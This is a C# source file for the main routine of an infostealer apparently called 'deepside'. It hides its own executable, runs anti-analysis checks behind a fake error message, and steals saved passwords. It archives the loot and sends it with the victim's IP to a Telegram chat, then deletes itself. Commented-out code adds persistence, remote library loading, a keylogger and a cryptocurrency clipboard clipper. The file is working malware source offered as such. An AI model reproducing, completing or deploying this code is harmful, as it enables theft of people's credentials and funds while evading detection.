using spasibozapas;
using System.Net;
using System.Threading;
using System;
using deepsidestubility;
using System.Net.Http.Formatting;
using System.Diagnostics;
using System.IO;

namespace deepside
{
    class Program
    { 
        static Program()
        {
            CosturaUtility.Initialize();
        }

        [System.STAThreadAttribute]
        static void Main(string[] args)
        {
            //CosturaUtility.Initialize();
            //string aye = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            //if ((!Libs.LoadRemoteLibrary(Libs.telebotdll)) || (!Libs.LoadRemoteLibrary(Libs.ZipLib)) /*|| (!Libs.LoadRemoteLibrary(Libs.AnonFile)) */|| (!Libs.LoadRemoteLibrary(Libs.BouncyCastle)) || (!Libs.LoadRemoteLibrary(Libs.indexrange)) || (!Libs.LoadRemoteLibrary(Libs.newtonsoft))|| (!Libs.LoadRemoteLibrary(Libs.sqliteinterpop)) || (!Libs.LoadRemoteLibrary(Libs.sqlitedata)) || (!Libs.LoadRemoteLibrary(Libs.textencoding)) || (!Libs.LoadRemoteLibrary(Libs.jsonxd)) || (!Libs.LoadRemoteLibrary(Libs.systemthreading)) || (!Libs.LoadRemoteLibrary(Libs.wtelegramclient)))
                //Implant.AntiAnalysis.FakeErrorMessage();
            //if (!File.Exists("blabla.config"))
            //{
            //    File.Create("blabla.config");
            //    deepside.Implant.Startup.HideFile("blabla.config");
            //    Process.Start(aye);
            //    Process.GetCurrentProcess().Kill();
            //}

            Thread 
                W_Thread = null,
                C_Thread = null;

            // SSL сучка
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            

            // Mutex check
            Implant.MutexControl.Check();

            // Hide executable on first start
            if (!Implant.Startup.IsFromStartup())
                Implant.Startup.HideFile();
            
            // If Telegram API or ID not exists => Self destruct.
            if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
                Implant.SelfDestruct.Melt();





            // Start delay
            if (Config.StartDelay == "1")
                Implant.StartDelay.Run();

            // Run AntiAnalysis modules
             if (Implant.AntiAnalysis.Run())
                Implant.AntiAnalysis.FakeErrorMessage();

            // Change working directory to appdata
            System.IO.Directory.SetCurrentDirectory(Paths.InitWorkDir());

            

            //Databasedem.CheckData();

            // Decrypt config strings
            Config.Init();

            // Test telegram API token
            if (!Telegram.Report.TokenIsValid())
                Implant.SelfDestruct.Melt();



            
            // Steal passwords
            string passwords = Passwords.Save();
            //Console.WriteLine("passwords " + passwords);
            //System.Console.ReadLine();
            // Compress directory
            string archive = Filemanager.CreateArchive(passwords);
            //Console.WriteLine("archive: " + archive);
            if (string.IsNullOrEmpty(archive))
            {
                string message = "\n👤IP: " + SystemInfo.GetPublicIP() + "\n Nothing data!";
                deepside.Telegram.Report.SendMessage(message);
                Implant.SelfDestruct.Melt();
            }
            // Send archive
            TelegramSender.SendFile(archive, Config.TelegramID);
            //Telegram.Report.SendReport(archive);
            // Install to startup if enabled in config and not installed
            //if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
            //if (!Implant.Startup.IsInstalled() && !Implant.Startup.IsFromStartup())
            //Implant.Startup.Install();


            Thread.Sleep(40000);
           
            //// Run kl module
            //if (Config.klModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
            //{
            //    Logging.Log("Starting kl modules...");
            //    W_Thread = WindowManager.MainThread;
            //    W_Thread.SetApartmentState(ApartmentState.STA);
            //    W_Thread.Start();


            //}

            //// Run clipper module
            //if (Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1")
            //{
            //    Logging.Log("Starting cl modules...");
            //    C_Thread = ClipboardManager.MainThread;
            //    C_Thread.SetApartmentState(ApartmentState.STA);
            //    C_Thread.Start();
            //}

            // Wait threads
            if (W_Thread != null) if (W_Thread.IsAlive) W_Thread.Join();
            if (W_Thread != null) if (C_Thread.IsAlive) C_Thread.Join();
            Implant.SelfDestruct.Melt();
            // Remove executable if running not from startup directory
            //if (!Implant.Startup.IsFromStartup())
            //    Implant.SelfDestruct.Melt();

        }
    }
}
